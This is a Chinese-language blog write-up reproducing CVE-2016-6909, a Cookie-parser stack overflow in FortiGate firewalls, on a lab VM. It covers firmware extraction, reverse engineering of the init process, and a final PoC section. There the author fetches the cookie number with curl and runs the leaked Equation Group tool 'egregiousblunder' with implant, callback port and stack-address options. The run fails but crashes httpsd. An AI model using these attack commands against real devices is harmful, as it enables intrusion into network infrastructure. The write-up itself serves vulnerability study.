<!DOCTYPE html>
<html lang="zh-CN" color-mode="light">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="keywords" content="" />
  <meta name="author" content="arttnba3" />
  <meta name="description" content="あがいた夢を捨てて揺れる今日は眠って誤魔化せ" />
  
  
  <title>
    
      【CVE.0x03】CVE-2016-6909 Fortigate 防火墙 Cookie 解析漏洞复现及简要分析 
      
      
      |
    
     arttnba3&#39;s blog
  </title>

  
    <link rel="apple-touch-icon" href="/img/favicon.png">
    <link rel="icon" href="/img/favicon.png">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  
<link rel="stylesheet" href="/css/color-scheme.css">
<link rel="stylesheet" href="/css/base.css">
<link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css">
<link rel="stylesheet" href="/css/github-markdown.css">
<link rel="stylesheet" href="/css/highlight.css">
<link rel="stylesheet" href="/css/comments.css">

  <!-- 代码块风格 -->
  

  <!-- jquery3.3.1 -->
  
    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
  

  <!-- fancybox -->
  
    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
  
  
<script src="/js/fancybox.js"></script>


  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>
<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="arttnba3's blog" type="application/atom+xml">
</head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a target="_blank" rel="noopener" href="https://arttnba3.cn">
      <!-- 头像取消懒加载，添加no-lazy -->
      
        <img src="/img/avatar.png" alt="">
      
    </a>
    <div class="nickname"><a target="_blank" rel="noopener" href="https://arttnba3.cn">arttnba3's blog</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">Home</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/categories/">
          <a href="/categories/">Categories</a>
        </li>
      
        <li class="nav-item" data-path="/tags/">
          <a href="/tags/">Tags</a>
        </li>
      
        <li class="nav-item" data-path="/friends/">
          <a href="/friends/">Friends</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">About</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="/js/activeNav.js"></script>



      <div class="flex-container">
        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->


  <!-- LaTex Display -->

  
    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
  
  <script>
    MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      }
    }
  </script>





  <!-- clipboard -->

  
    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
  
  
<script src="/js/codeCopy.js"></script>







  

  

  

  
  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
  <div class="container post-details" id="post-details">
    <div class="post-content">
      <div class="post-title">【CVE.0x03】CVE-2016-6909 Fortigate 防火墙 Cookie 解析漏洞复现及简要分析</div>
      <div class="post-attach">
        <span class="post-pubtime">
          <i class="iconfont icon-updatetime" title="更新时间"></i>
          2021-08-10 17:42:05
        </span>
        
              <span class="post-categories">
                <i class="iconfont icon-bookmark" title="分类"></i>
                
                <span class="span--category">
                  <a href="/categories/CVE/" title="CVE">
                    <b>#</b> CVE
                  </a>
                </span>
                
              </span>
          
              <span class="post-tags">
                <i class="iconfont icon-tags" title="标签"></i>
                
                <span class="span--tag">
                  <a href="/tags/Pwn/" title="Pwn">
                    <b>#</b> Pwn
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/CVE/" title="CVE">
                    <b>#</b> CVE
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/Linux/" title="Linux">
                    <b>#</b> Linux
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/ret2text/" title="ret2text">
                    <b>#</b> ret2text
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/ROP/" title="ROP">
                    <b>#</b> ROP
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" title="栈溢出">
                    <b>#</b> 栈溢出
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/ret2shellcode/" title="ret2shellcode">
                    <b>#</b> ret2shellcode
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/shellcode/" title="shellcode">
                    <b>#</b> shellcode
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/Fortigate/" title="Fortigate">
                    <b>#</b> Fortigate
                  </a>
                </span>
                
              </span>
          
      </div>
      <div class="markdown-body">
        <p>彁我着🔥了.jpg</p>
<span id="more"></span>

<blockquote>
<p>特别特别特别特别*N….简单的一个洞，本来应该一天就弄好的，愣是因为各种玄学问题在公司拗了半周….</p>
<p>还是因为太菜了（恼）</p>
</blockquote>
<h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>Fortigate 系列是 Fortinet（飞塔）公司旗下的防火墙产品之一，2016年，Shadow Brokers公开了黑客组织<strong>Equation Group</strong>针对各大厂商防火墙的<a target="_blank" rel="noopener" href="https://musalbas.com/blog/2016/08/16/equation-group-firewall-operations-catalogue.html">漏洞利用工具</a>，存在于 Fortigate 中的一个隐蔽的栈溢出漏洞也就此被大白于天下</p>
<p>在 <a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6909">cve.mitre.org</a> 上对该漏洞的说明如下：</p>
<blockquote>
<p>Buffer overflow in the Cookie parser in Fortinet FortiOS 4.x before 4.1.11, 4.2.x before 4.2.13, and 4.3.x before 4.3.9 and FortiSwitch before 3.4.3 allows remote attackers to execute arbitrary code via a crafted HTTP request, aka EGREGIOUSBLUNDER.</p>
</blockquote>
<p>笔者今天将借助受影响的一个虚拟机版本 <strong>FGT_VM-v400-build0482</strong> 来分析该漏洞</p>
<h2 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h2><p>Fortinet FortiOS 4.x &lt; 4.1.11, 4.2.x &lt; 4.2.13, 4.3.x &lt; 4.3.9、FortiSwitch &lt; 3.4.3</p>
<h2 id="登入-fortigate-VM"><a href="#登入-fortigate-VM" class="headerlink" title="登入 fortigate VM"></a>登入 fortigate VM</h2><p>默认账户是 <code>admin</code> ，无密码，可以用于本地测试</p>
<p><img src="https://i.loli.net/2021/08/13/7WNytbF5MGnsfVA.png" alt="image.png"></p>
<p>通常情况下防火墙不会给我们提供 shell，而是<strong>仅</strong>提供一个简易 CLI 界面，在上面我们只能使用其所内置提供的几个功能</p>
<h2 id="后门指令"><a href="#后门指令" class="headerlink" title="后门指令"></a>后门指令</h2><p>仅靠防火墙的功能基本上不算是一个可用的操作系统，因此 fortigate VM CLI 提供给我们一个隐藏指令 <code>fnsysctl</code> 以执行其限制的诸如 <code>ls</code> 等的一些基本命令，<strong>不包括 shell</strong></p>
<blockquote>
<p>后续通过逆向分析我们可以发现其程序本身限制了过滤 sh，因此我们无法通过 CLI 直接拿到一个 shell</p>
</blockquote>
<p><img src="https://i.loli.net/2021/08/13/4G3kJV8vxMpqTsn.png" alt="image.png"></p>
<h1 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01.漏洞分析"></a>0x01.漏洞分析</h1><h2 id="文件提取"><a href="#文件提取" class="headerlink" title="文件提取"></a>文件提取</h2><p>首先将硬盘镜像 <code>fortios.vmdk</code> 挂载到 <code>/mnt</code> 目录下：</p>
<p><img src="https://i.loli.net/2021/08/11/dsRm83O24UhATKj.png" alt="image.png"></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo fdisk -l</span></span><br><span class="line">...</span><br><span class="line">Device     Boot  Start     End Sectors  Size Id Type</span><br><span class="line">/dev/sdb1  *         1  262144  262144  128M 83 Linux</span><br><span class="line">/dev/sdb2       262145 4194304 3932160  1.9G 83 Linux</span><br><span class="line">...</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">mkdir</span> /mnt/fortios</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo mount /dev/sdb1 /mnt/fortios</span></span><br></pre></td></tr></table></figure>


<p>之后我们便能够在 <code>/mnt</code> 目录下查看磁盘中的文件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> /mnt/fortios</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll</span></span><br><span class="line">total 23392</span><br><span class="line">drwxr-xr-x 3 root root     1024 Sep 20  2011 ./</span><br><span class="line">drwxr-xr-x 5 root root     4096 Aug 10 18:43 ../</span><br><span class="line">-rw-r--r-- 1 root root  5182591 Sep 20  2011 datafs.tar.gz</span><br><span class="line">-rw-r--r-- 1 root root      107 Sep 20  2011 extlinux.conf</span><br><span class="line">lrwxrwxrwx 1 root root       12 Sep 20  2011 flatkc -&gt; ./flatkc.smp</span><br><span class="line">-rw-r--r-- 1 root root      256 Sep 20  2011 flatkc.chk</span><br><span class="line">-rw-r--r-- 1 root root  1437300 Sep 20  2011 flatkc.nosmp</span><br><span class="line">-rw-r--r-- 1 root root  1501003 Sep 20  2011 flatkc.smp</span><br><span class="line">-r--r--r-- 1 root root    32256 Sep 20  2011 ldlinux.sys</span><br><span class="line">drwx------ 2 root root    12288 Sep 20  2011 lost+found/</span><br><span class="line">-rw-r--r-- 1 root root 15678360 Sep 20  2011 rootfs.gz</span><br><span class="line">-rw-r--r-- 1 root root      256 Sep 20  2011 rootfs.gz.chk</span><br></pre></td></tr></table></figure>

<blockquote>
<p>也可以通过如下方式直接挂载镜像文件：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo modprobe nbd</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo qemu-nbd -r -c /dev/nbd1 ./fortios.vmdk</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo mount /dev/nbd1p1 /mnt</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>查看文件类型，我们可以发现两个内核镜像文件 <code>flatkc.smp</code> 与 <code>flatkc.nosmp</code>：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">file *</span></span><br><span class="line">datafs.tar.gz: gzip compressed data, last modified: Tue Sep 20 20:17:56 2011, from Unix, original size modulo 2^32 8724480</span><br><span class="line">extlinux.conf: ASCII text</span><br><span class="line">flatkc:        symbolic link to ./flatkc.smp</span><br><span class="line">flatkc.chk:    data</span><br><span class="line">flatkc.nosmp:  Linux kernel x86 boot executable bzImage, version 2.4.25 (root@build170) #2 Tue Sep 20 12:46:19 PDT 2011, RO-rootFS, Normal VGA</span><br><span class="line">flatkc.smp:    Linux kernel x86 boot executable bzImage, version 2.4.25 (root@build170) #3 Tue Sep 20 12:49:39 PDT 2011, RO-rootFS, Normal VGA</span><br><span class="line">ldlinux.sys:   SYSLINUX loader (version 4.00)</span><br><span class="line">lost+found:    directory</span><br><span class="line">rootfs.gz:     gzip compressed data, last modified: Tue Sep 20 20:17:52 2011, from Unix, original size modulo 2^32 19077120</span><br><span class="line">rootfs.gz.chk: data</span><br></pre></td></tr></table></figure>

<p>在 <code>extlinux.conf</code> 中指定了一些基本配置，包括文件系统 <code>rootfs.gz</code>：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> extlinux.conf</span> </span><br><span class="line">DEFAULT flatkc ro panic=5 endbase=0xA0000 console=tty0 root=/dev/ram0 ramdisk_size=65536 initrd=/rootfs.gz</span><br></pre></td></tr></table></figure>

<p>解压 <code>rootfs.gz</code> ：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tar xf ./rootfs.gz</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll</span></span><br><span class="line">total 28216</span><br><span class="line">drwxr-xr-x 10 arttnba3 arttnba3     4096 Sep 20  2011 ./</span><br><span class="line">drwxr-xr-x  5 arttnba3 arttnba3     4096 Aug 10 18:52 ../</span><br><span class="line">-rw-r--r--  1 arttnba3 arttnba3  8742988 Sep 20  2011 bin.tar.xz</span><br><span class="line">drwxr-xr-x  2 arttnba3 arttnba3     4096 Sep 20  2011 data/</span><br><span class="line">drwxr-xr-x  2 arttnba3 arttnba3     4096 Sep 20  2011 data2/</span><br><span class="line">drwxr-xr-x  5 arttnba3 arttnba3     4096 Sep 20  2011 dev/</span><br><span class="line">lrwxrwxrwx  1 arttnba3 arttnba3        8 Sep 20  2011 etc -&gt; data/etc</span><br><span class="line">lrwxrwxrwx  1 arttnba3 arttnba3        1 Sep 20  2011 fortidev -&gt; //</span><br><span class="line">drwxr-xr-x  2 arttnba3 arttnba3     4096 Sep 20  2011 lib/</span><br><span class="line">-rw-r--r--  1 arttnba3 arttnba3  4424536 Sep 20  2011 migadmin.tar.xz</span><br><span class="line">drwxr-xr-x  2 arttnba3 arttnba3     4096 Sep 20  2011 proc/</span><br><span class="line">-rw-r--r--  1 arttnba3 arttnba3 15678360 Aug 10 18:54 rootfs.gz</span><br><span class="line">drwxr-xr-x  2 arttnba3 arttnba3     4096 Sep 20  2011 sbin/</span><br><span class="line">drwxr-xr-x  2 arttnba3 arttnba3     4096 Sep 20  2011 tmp/</span><br><span class="line">drwxr-xr-x  8 arttnba3 arttnba3     4096 Sep 20  2011 var/</span><br></pre></td></tr></table></figure>

<h2 id="启动过程分析"><a href="#启动过程分析" class="headerlink" title="启动过程分析"></a>启动过程分析</h2><h3 id="I-init-进程"><a href="#I-init-进程" class="headerlink" title="I. init 进程"></a>I. init 进程</h3><p>Linux 内核载入后会启动第一个进程 <code>init</code>，程序二进制文件通常是 <code>/sbin/init</code>，该文件系统中的 init 文件较小，故我们可以直接将其拖入 IDA 进行分析：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *argv[<span class="number">2</span>]; <span class="comment">// [esp+0h] [ebp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)sub_8049254(<span class="string">&quot;bin&quot;</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">    sub_8049254(<span class="string">&quot;migadmin&quot;</span>);</span><br><span class="line">  unlink(<span class="string">&quot;/sbin/xz&quot;</span>);</span><br><span class="line">  unlink(<span class="string">&quot;/sbin/ftar&quot;</span>);</span><br><span class="line">  argv[<span class="number">0</span>] = <span class="string">&quot;/bin/init&quot;</span>;</span><br><span class="line">  argv[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  execve(<span class="string">&quot;/bin/init&quot;</span>, argv, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中 <code>sub_8049254()</code> 核心逆向结果如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_8049254</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  <span class="built_in">snprintf</span>(s, <span class="number">0x200</span>u, <span class="string">&quot;/%s.tar.xz&quot;</span>, a1);</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  v1 = fork();</span><br><span class="line">  <span class="keyword">if</span> ( v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      waitpid(v1, &amp;stat_loc, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( BYTE1(stat_loc) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">      unlink(s);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    argv[<span class="number">0</span>] = <span class="string">&quot;/sbin/xz&quot;</span>;</span><br><span class="line">    argv[<span class="number">1</span>] = <span class="string">&quot;--check=sha256&quot;</span>;</span><br><span class="line">    argv[<span class="number">2</span>] = <span class="string">&quot;-d&quot;</span>;</span><br><span class="line">    argv[<span class="number">3</span>] = s;</span><br><span class="line">    argv[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">    execv(<span class="string">&quot;/sbin/xz&quot;</span>, argv);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">snprintf</span>(name, <span class="number">0x200</span>u, <span class="string">&quot;/%s.tar&quot;</span>, a1);</span><br><span class="line">  v3 = fork();</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//..</span></span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    waitpid(v3, &amp;v10, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !BYTE1(v10) )</span><br><span class="line">    &#123;</span><br><span class="line">      unlink(name);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_21:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;decompress init failed&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v12[<span class="number">0</span>] = <span class="string">&quot;/sbin/ftar&quot;</span>;</span><br><span class="line">  v12[<span class="number">1</span>] = <span class="string">&quot;-xf&quot;</span>;</span><br><span class="line">  v12[<span class="number">2</span>] = name;</span><br><span class="line">  v12[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">  execv(<span class="string">&quot;/sbin/ftar&quot;</span>, v12);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>故 init 进程分析如下：</p>
<ul>
<li>检查 <code>/bin.tar.xz</code> 是否存在，若是则创建子进程执行 <code>/sbin/xz --check=sha256 -d /bin.tar.xz</code>，父进程等待子进程结束后删除<code>/bin.tar.xz</code>，之后检查 <code>/bin.tar</code> 是否存在，若是则创建子进程执行 <code>/sbin/ftar -xf /bin.tar</code>，父进程等待子进程结束后删除<code>/bin.tar</code></li>
<li>上一步成功后检查 <code>/migadmin.tar.xz</code> 是否存在，若是则创建子进程执行 <code>/sbin/xz --check=sha256 -d /migadmin.tar.xz</code>，父进程等待子进程结束后删除<code>/migadmin.tar.xz</code>，之后检查 <code>/migadmin.tar</code> 是否存在，若是则创建子进程执行 <code>/sbin/ftar -xf /migadmin.tar</code>，父进程等待子进程结束后删除<code>/migadmin.tar</code></li>
<li>删除 <code>/sbin/xz</code></li>
<li>删除 <code>/sbin/ftar</code></li>
<li>执行 <code>/bin/init</code></li>
</ul>
<p>由于 <code>ftar</code> 与 <code>xz</code> 都指定了调用的库的目录如下：</p>
<p><img src="https://i.loli.net/2021/08/11/4exwH7Pkgh5JdGE.png" alt="image.png"></p>
<p>故需要通过切换根目录执行进行解压：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">chroot</span> . /sbin/xz --check=sha256 -d /bin.tar.xz</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">chroot</span> . /sbin/ftar -xf /bin.tar</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">chroot</span> . /sbin/xz --check=sha256 -d /migadmin.tar.xz</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">chroot</span> . /sbin/ftar -xf /migadmin.tar</span></span><br></pre></td></tr></table></figure>

<h3 id="II-bin-目录文件分析"><a href="#II-bin-目录文件分析" class="headerlink" title="II. bin 目录文件分析"></a>II. bin 目录文件分析</h3><p>我们可以看到的是，<code>bin.tar.xz</code> 解压出来的文件基本上都是指向 <code>/bin/init</code> 与 <code>/bin/sysctl</code> 的软链接</p>
<p>其中诸如 <code>httpsd</code> 等网络服务都是前者的软链接，可知前者应当为该防火墙提供的基本的网络服务</p>
<p>而诸如 <code>chmod</code> 等常用命令都是后者的软链接，可知后者应当为类似 busybox 一样的工具库，不过更为精简</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll</span></span><br><span class="line">total 31200</span><br><span class="line">drwxr-xr-x  2 root     root         4096 Aug 10 19:35 ./</span><br><span class="line">drwxr-xr-x 12 arttnba3 arttnba3     4096 Aug 10 19:37 ../</span><br><span class="line">lrwxrwxrwx  1 root     root            9 Aug 10 19:35 adsl_mon -&gt; /bin/init</span><br><span class="line">lrwxrwxrwx  1 root     root            9 Aug 10 19:35 alarmd -&gt; /bin/init</span><br><span class="line">lrwxrwxrwx  1 root     root            9 Aug 10 19:35 alertmail -&gt; /bin/init</span><br><span class="line">lrwxrwxrwx  1 root     root            9 Aug 10 19:35 authd -&gt; /bin/init</span><br><span class="line">lrwxrwxrwx  1 root     root            9 Aug 10 19:35 bgpd -&gt; /bin/init</span><br><span class="line">lrwxrwxrwx  1 root     root            9 Aug 10 19:35 cardctl -&gt; /bin/init</span><br><span class="line">lrwxrwxrwx  1 root     root            9 Aug 10 19:35 cardmgr -&gt; /bin/init</span><br><span class="line">lrwxrwxrwx  1 root     root           11 Aug 10 19:35 cat -&gt; /bin/sysctl</span><br><span class="line">lrwxrwxrwx  1 root     root            9 Aug 10 19:35 cauploadd -&gt; /bin/init</span><br><span class="line">lrwxrwxrwx  1 root     root            9 Aug 10 19:35 chassis5000d -&gt; /bin/init</span><br><span class="line">lrwxrwxrwx  1 root     root            9 Aug 10 19:35 chassisd -&gt; /bin/init</span><br><span class="line">lrwxrwxrwx  1 root     root            9 Aug 10 19:35 chat -&gt; /bin/init</span><br><span class="line">lrwxrwxrwx  1 root     root            9 Aug 10 19:35 chlbd -&gt; /bin/init</span><br><span class="line">lrwxrwxrwx  1 root     root           11 Aug 10 19:35 chmod -&gt; /bin/sysctl</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h3 id="III-x2F-bin-x2F-init-逆向分析"><a href="#III-x2F-bin-x2F-init-逆向分析" class="headerlink" title="III. &#x2F;bin&#x2F;init 逆向分析"></a>III. &#x2F;bin&#x2F;init 逆向分析</h3><p>拖入 IDA 进行分析：</p>
<p>首先会执行 <code>/bin/initXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</code> 替换自身，该文件其实是 <code>/bin/init</code> 的软链接，故这里本质上只是更改了 pid 与 argv[0]</p>
<p>随后会关闭三个标准文件描述符并改变当前工作目录为 <code>/</code>，打开 <code>/dev/null</code> 并创建三个指向其的文件描述符（0、1、2）</p>
<blockquote>
<p>笔者后续曾经一度认为利用失败就是因为没有注意到输入输出被重定向至 null 而无法在屏幕上打印出任何信息</p>
</blockquote>
<p><img src="https://i.loli.net/2021/08/11/vB5HUkGSR67P9yi.png" alt="image.png"></p>
<p>启动后的界面如下：</p>
<p><img src="https://i.loli.net/2021/08/11/pRVcK5Z1szT2uU3.png" alt="image.png"></p>
<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>首先为我们的虚拟机配置一个本地 ip</p>
<p><img src="https://i.loli.net/2021/08/11/YzTN9P82sJiaBFc.png" alt="4M4_Z96@_NSPZR087A2_6QC.png"></p>
<p>接下来我们还需要获取到一个 cookie num：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">curl -X HEAD -v http://192.168.116.100/login  2&gt;&amp;1 | grep <span class="string">&#x27;APSCOOKIE&#x27;</span></span></span><br><span class="line">&lt; Set-Cookie: APSCOOKIE_3943997904=0&amp;0; path=/; expires=Tue, 24-Aug-1971 18:40:48 GMT</span><br></pre></td></tr></table></figure>

<p>之后使用 <code>egregiousblunder</code> 测试该漏洞，如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./egregiousblunder_3.0.0.1 -t 192.168.116.100 -p 80 -l 4444 --ssl 0 --nope --gen 4nc --config EGBL.config --cookienum 3943997904 --stack 0xbffff114</span></span><br><span class="line">loading nopen over HTTP</span><br><span class="line">using stack addr 0xbffff114</span><br><span class="line">built authhash len 116</span><br><span class="line">built enc_authhash with len 116</span><br><span class="line">problem recv&#x27;ing ack1/hello, stack address probably wrong.  WAM might work?</span><br><span class="line">problem with sending file</span><br><span class="line">failure loading nopen over HTTP</span><br></pre></td></tr></table></figure>

<p>此时在 fortigate 的 CLI 中我们便可以看到 httpsd 服务的崩溃信息及栈回溯</p>
<p><img src="https://i.loli.net/2021/08/11/fOPSQBG2elVkKja.png" alt="image.png"></p>
